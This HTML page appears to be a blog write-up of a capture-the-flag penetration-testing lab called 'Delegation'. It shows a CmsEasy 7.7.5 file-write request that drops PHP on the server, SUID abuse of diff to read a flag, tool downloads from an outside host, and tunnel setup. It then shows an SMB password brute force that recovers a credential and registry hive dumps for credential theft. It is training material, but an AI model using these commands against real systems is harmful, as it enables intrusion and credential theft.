<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="easyCMS7.7.5、LocalSystem转储hash、DFSCoerce强制认证 + Kerberos 票据劫持、DCSync"><title>春秋云镜Delegation</title><link rel=canonical href=https://baozongwi.xyz/p/springautumn-cloudmirror--delegation/><link rel=stylesheet href=/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css><meta property='og:title' content="春秋云镜Delegation"><meta property='og:description' content="easyCMS7.7.5、LocalSystem转储hash、DFSCoerce强制认证 + Kerberos 票据劫持、DCSync"><meta property='og:url' content='https://baozongwi.xyz/p/springautumn-cloudmirror--delegation/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Pentest'><meta property='article:published_time' content='2025-08-28T21:47:03+08:00'><meta property='article:modified_time' content='2025-08-28T21:47:03+08:00'><meta name=twitter:title content="春秋云镜Delegation"><meta name=twitter:description content="easyCMS7.7.5、LocalSystem转储hash、DFSCoerce强制认证 + Kerberos 票据劫持、DCSync"><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1><h2 class=site-description>H@cking Th3 Fu1ure</h2></div></header><ol class=menu-social><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-map-pin"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z"/><circle cx="12" cy="10" r="3"/></svg>
<span>travel</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#flag1>flag1</a></li><li><a href=#flag2>flag2</a></li><li><a href=#flag3flag4>flag3&&amp;flag4</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/>春秋云镜</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/springautumn-cloudmirror--delegation/>春秋云镜Delegation</a></h2><h3 class=article-subtitle>easyCMS7.7.5、LocalSystem转储hash、DFSCoerce强制认证 + Kerberos 票据劫持、DCSync</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Aug 28, 2025</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>4 minute read</time></div></footer></div></header><section class=article-content><h2 id=flag1>flag1</h2><p>打开看到是easyCMS，管理员弱密码<code>/admin</code>，登录<code>admin\123456</code></p><p><a class=link href=https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9Egetshell target=_blank rel=noopener>https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9Egetshell</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>POST /index.php?case<span class=o>=</span>template<span class=p>&amp;</span><span class=nv>act</span><span class=o>=</span>save<span class=p>&amp;</span><span class=nv>admin_dir</span><span class=o>=</span>admin<span class=p>&amp;</span><span class=nv>site</span><span class=o>=</span>default HTTP/1.1
</span></span><span class=line><span class=cl>Host: 39.99.235.44
</span></span><span class=line><span class=cl>Cookie: <span class=nv>PHPSESSID</span><span class=o>=</span>sg1g6abcfcmvagpbanm7cd78h8<span class=p>;</span><span class=nv>login_username</span><span class=o>=</span>admin<span class=p>;</span> <span class=nv>login_password</span><span class=o>=</span>a14cdfc627cef32c707a7988e70c1313<span class=p>;</span>
</span></span><span class=line><span class=cl>Cache-Control: max-age<span class=o>=</span><span class=m>0</span>
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: <span class=m>1</span>
</span></span><span class=line><span class=cl>X-Requested-With: XMLHttpRequest
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 <span class=o>(</span>Windows NT 10.0<span class=p>;</span> Win64<span class=p>;</span> x64<span class=o>)</span> AppleWebKit/537.36 <span class=o>(</span>KHTML, like Gecko<span class=o>)</span> Chrome/137.0.0.0 Safari/537.36
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml<span class=p>;</span><span class=nv>q</span><span class=o>=</span>0.9,image/avif,image/webp,image/apng,*/*<span class=p>;</span><span class=nv>q</span><span class=o>=</span>0.8,application/signed-exchange<span class=p>;</span><span class=nv>v</span><span class=o>=</span>b3<span class=p>;</span><span class=nv>q</span><span class=o>=</span>0.7
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh<span class=p>;</span><span class=nv>q</span><span class=o>=</span>0.9,en<span class=p>;</span><span class=nv>q</span><span class=o>=</span>0.8
</span></span><span class=line><span class=cl>Content-Type: application/x-www-form-urlencoded
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>sid</span><span class=o>=</span><span class=c1>#data_d_.._d_.._d_.._d_1.php&amp;slen=693&amp;scontent=&lt;?php phpinfo();?&gt;</span>
</span></span></code></pre></td></tr></table></div></div><p>写一个木马</p><p><img src=/p/springautumn-cloudmirror--delegation/1.png width=1364 height=810 srcset="/p/springautumn-cloudmirror--delegation/1_hu_6e937041581c2199.png 480w, /p/springautumn-cloudmirror--delegation/1_hu_d95c017c0a8a2ed1.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=168 data-flex-basis=404px></p><p>suid提权，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>www-data:/var/www/html<span class=o>)</span> $ find / -perm -u<span class=o>=</span>s -type f 2&gt;/dev/null
</span></span><span class=line><span class=cl>/usr/bin/stapbpf
</span></span><span class=line><span class=cl>/usr/bin/gpasswd
</span></span><span class=line><span class=cl>/usr/bin/chfn
</span></span><span class=line><span class=cl>/usr/bin/su
</span></span><span class=line><span class=cl>/usr/bin/chsh
</span></span><span class=line><span class=cl>/usr/bin/staprun
</span></span><span class=line><span class=cl>/usr/bin/at
</span></span><span class=line><span class=cl>/usr/bin/diff
</span></span><span class=line><span class=cl>/usr/bin/fusermount
</span></span><span class=line><span class=cl>/usr/bin/sudo
</span></span><span class=line><span class=cl>/usr/bin/mount
</span></span><span class=line><span class=cl>/usr/bin/newgrp
</span></span><span class=line><span class=cl>/usr/bin/umount
</span></span><span class=line><span class=cl>/usr/bin/passwd
</span></span><span class=line><span class=cl>/usr/lib/openssh/ssh-keysign
</span></span><span class=line><span class=cl>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
</span></span><span class=line><span class=cl>/usr/lib/eject/dmcrypt-get-device
</span></span></code></pre></td></tr></table></div></div><p><a class=link href=https://gtfobins.github.io/gtfobins/diff/ target=_blank rel=noopener>https://gtfobins.github.io/gtfobins/diff/</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>diff --recursive <span class=k>$(</span>mktemp -d<span class=k>)</span> /home/flag/
</span></span><span class=line><span class=cl>diff --line-format<span class=o>=</span>%L /dev/null /home/flag/flag01.txt
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/springautumn-cloudmirror--delegation/2.png width=1081 height=372 srcset="/p/springautumn-cloudmirror--delegation/2_hu_7263b00bc629f8d3.png 480w, /p/springautumn-cloudmirror--delegation/2_hu_a724c6bf635dc5b.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=290 data-flex-basis=697px></p><h2 id=flag2>flag2</h2><p>把fscan和ligolo-ng传上去，扫描内网和搭建代理</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>cd</span> /tmp
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>wget http://8.137.148.227/fscan
</span></span><span class=line><span class=cl>wget http://8.137.148.227/agent
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>chmod +x *
</span></span></code></pre></td></tr></table></div></div><p>先用fscan扫描一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>www-data:/tmp<span class=o>)</span> $ ifconfig
</span></span><span class=line><span class=cl>eth0: <span class=nv>flags</span><span class=o>=</span>4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class=m>1500</span>
</span></span><span class=line><span class=cl>        inet 172.22.4.36  netmask 255.255.0.0  broadcast 172.22.255.255
</span></span><span class=line><span class=cl>        inet6 fe80::216:3eff:fe08:f3f1  prefixlen <span class=m>64</span>  scopeid 0x20&lt;link&gt;
</span></span><span class=line><span class=cl>        ether 00:16:3e:08:f3:f1  txqueuelen <span class=m>1000</span>  <span class=o>(</span>Ethernet<span class=o>)</span>
</span></span><span class=line><span class=cl>        RX packets <span class=m>98299</span>  bytes <span class=m>137936303</span> <span class=o>(</span>137.9 MB<span class=o>)</span>
</span></span><span class=line><span class=cl>        RX errors <span class=m>0</span>  dropped <span class=m>0</span>  overruns <span class=m>0</span>  frame <span class=m>0</span>
</span></span><span class=line><span class=cl>        TX packets <span class=m>22820</span>  bytes <span class=m>5577708</span> <span class=o>(</span>5.5 MB<span class=o>)</span>
</span></span><span class=line><span class=cl>        TX errors <span class=m>0</span>  dropped <span class=m>0</span> overruns <span class=m>0</span>  carrier <span class=m>0</span>  collisions <span class=m>0</span>
</span></span><span class=line><span class=cl>lo: <span class=nv>flags</span><span class=o>=</span>73&lt;UP,LOOPBACK,RUNNING&gt;  mtu <span class=m>65536</span>
</span></span><span class=line><span class=cl>        inet 127.0.0.1  netmask 255.0.0.0
</span></span><span class=line><span class=cl>        inet6 ::1  prefixlen <span class=m>128</span>  scopeid 0x10&lt;host&gt;
</span></span><span class=line><span class=cl>        loop  txqueuelen <span class=m>1000</span>  <span class=o>(</span>Local Loopback<span class=o>)</span>
</span></span><span class=line><span class=cl>        RX packets <span class=m>656</span>  bytes <span class=m>57319</span> <span class=o>(</span>57.3 KB<span class=o>)</span>
</span></span><span class=line><span class=cl>        RX errors <span class=m>0</span>  dropped <span class=m>0</span>  overruns <span class=m>0</span>  frame <span class=m>0</span>
</span></span><span class=line><span class=cl>        TX packets <span class=m>656</span>  bytes <span class=m>57319</span> <span class=o>(</span>57.3 KB<span class=o>)</span>
</span></span><span class=line><span class=cl>        TX errors <span class=m>0</span>  dropped <span class=m>0</span> overruns <span class=m>0</span>  carrier <span class=m>0</span>  collisions <span class=m>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>./fscan -h 172.22.4.36/24
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>172.22.4.36:21 open
</span></span><span class=line><span class=cl>172.22.4.45:445 open
</span></span><span class=line><span class=cl>172.22.4.19:445 open
</span></span><span class=line><span class=cl>172.22.4.7:445 open
</span></span><span class=line><span class=cl>172.22.4.45:139 open
</span></span><span class=line><span class=cl>172.22.4.7:139 open
</span></span><span class=line><span class=cl>172.22.4.45:135 open
</span></span><span class=line><span class=cl>172.22.4.19:139 open
</span></span><span class=line><span class=cl>172.22.4.19:135 open
</span></span><span class=line><span class=cl>172.22.4.7:135 open
</span></span><span class=line><span class=cl>172.22.4.36:80 open
</span></span><span class=line><span class=cl>172.22.4.45:80 open
</span></span><span class=line><span class=cl>172.22.4.36:22 open
</span></span><span class=line><span class=cl>172.22.4.7:88 open
</span></span><span class=line><span class=cl>172.22.4.36:3306 open
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetBios 172.22.4.45     XIAORANG<span class=se>\W</span>IN19                
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetBios 172.22.4.7      <span class=o>[</span>+<span class=o>]</span> DC:DC01.xiaorang.lab             Windows Server <span class=m>2016</span> Datacenter <span class=m>14393</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetInfo 
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>172.22.4.7
</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>DC01
</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>172.22.4.7
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetInfo 
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>172.22.4.19
</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>FILESERVER
</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>172.22.4.19
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetInfo 
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>172.22.4.45
</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>WIN19
</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>172.22.4.45
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> OsInfo 172.22.4.7	<span class=o>(</span>Windows Server <span class=m>2016</span> Datacenter 14393<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetBios 172.22.4.19     FILESERVER.xiaorang.lab             Windows Server <span class=m>2016</span> Standard <span class=m>14393</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> WebTitle http://172.22.4.36        code:200 len:68100  title:中文网页标题
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> WebTitle http://172.22.4.45        code:200 len:703    title:IIS Windows Server
</span></span></code></pre></td></tr></table></div></div><ul><li>172.22.4.36 已经控下</li><li>172.22.4.45 XIAORANG\WIN19</li><li>172.22.4.7 DC01.xiaorang.lab</li><li>172.22.4.19 FILESERVER.xiaorang.lab</li></ul><p>搭建代理</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nohup ./agent -bind 0.0.0.0:10010 &gt; agent.log 2&gt;<span class=p>&amp;</span><span class=m>1</span> <span class=p>&amp;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>sudo ./proxy -selfcert -laddr <span class=s2>&#34;0.0.0.0:10001&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>connect_agent --ip 39.99.235.44:10010
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>interface_list
</span></span><span class=line><span class=cl>session
</span></span><span class=line><span class=cl>autoroute
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>nohup ./gost -L<span class=o>=</span>socks://:1080 &gt; gost.log 2&gt;<span class=p>&amp;</span><span class=m>1</span> <span class=p>&amp;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 查看是否开启</span>
</span></span><span class=line><span class=cl>ss -luntp
</span></span></code></pre></td></tr></table></div></div><p>既然给了WIN19这台机器的用户名，可以爆破smb</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>netexec smb 172.22.4.45 -u Adrian -p /usr/share/wordlists/rockyou.txt -d WIN19 --ignore-pw-decoding &gt; 1.log 2&gt;<span class=p>&amp;</span><span class=m>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>grep <span class=s2>&#34;\[+\]&#34;</span> 1.log
</span></span><span class=line><span class=cl>grep <span class=s2>&#34;password.*expir\|STATUS_PASSWORD_EXPIRED&#34;</span> 1.log
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>WIN19<span class=se>\A</span>drian babygirl1
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/springautumn-cloudmirror--delegation/3.png width=1002 height=77 srcset="/p/springautumn-cloudmirror--delegation/3_hu_4ddba31f841168f6.png 480w, /p/springautumn-cloudmirror--delegation/3_hu_2def52c4f7117868.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=1301 data-flex-basis=3123px></p><p>密码过期了，修改一下密码就好，登录之后看到有很多配置文件</p><p><img src=/p/springautumn-cloudmirror--delegation/4.png width=2080 height=1315 srcset="/p/springautumn-cloudmirror--delegation/4_hu_3845ecfc771cf407.png 480w, /p/springautumn-cloudmirror--delegation/4_hu_3d38dcd3ce6318c.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=158 data-flex-basis=379px></p><p>打开看到谷歌更新有特殊权限</p><p><img src=/p/springautumn-cloudmirror--delegation/5.png width=1861 height=203 srcset="/p/springautumn-cloudmirror--delegation/5_hu_97c0a6bb7e33aa5d.png 480w, /p/springautumn-cloudmirror--delegation/5_hu_bb6f3eca0d9b169d.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=916 data-flex-basis=2200px></p><p>查看注册表对于可执行文件的权限设置</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Get-Acl -path <span class=s2>&#34;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&#34;</span> <span class=p>|</span> fl *
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/springautumn-cloudmirror--delegation/6.png width=1455 height=775 srcset="/p/springautumn-cloudmirror--delegation/6_hu_6264a8569d32bb79.png 480w, /p/springautumn-cloudmirror--delegation/6_hu_566ddea360d8474b.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=187 data-flex-basis=450px></p><p><img src=/p/springautumn-cloudmirror--delegation/7.png width=1238 height=526 srcset="/p/springautumn-cloudmirror--delegation/7_hu_d0a36e182fde561b.png 480w, /p/springautumn-cloudmirror--delegation/7_hu_521840b1f0db5721.png 1024w" loading=lazy alt=1 class=gallery-image data-flex-grow=235 data-flex-basis=564px></p><p>可以去篡改这个启动项搞些恶意操作，仔细看是LocalSystem的User，可以转储sam</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bat data-lang=bat><span class=line><span class=cl>reg save hklm\system C:\Users\Adrian\Desktop\system
</span></span><span class=line><span class=cl>reg save hklm\sam C:\Users\Adrian\Desktop\sam
</span></span><span class=line><span class=cl>reg save hklm\security C:\Users\Adrian\Desktop\security
</span></span></code></pre></td></tr></table></div></div><p>再生成一个恶意exe进行替换</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
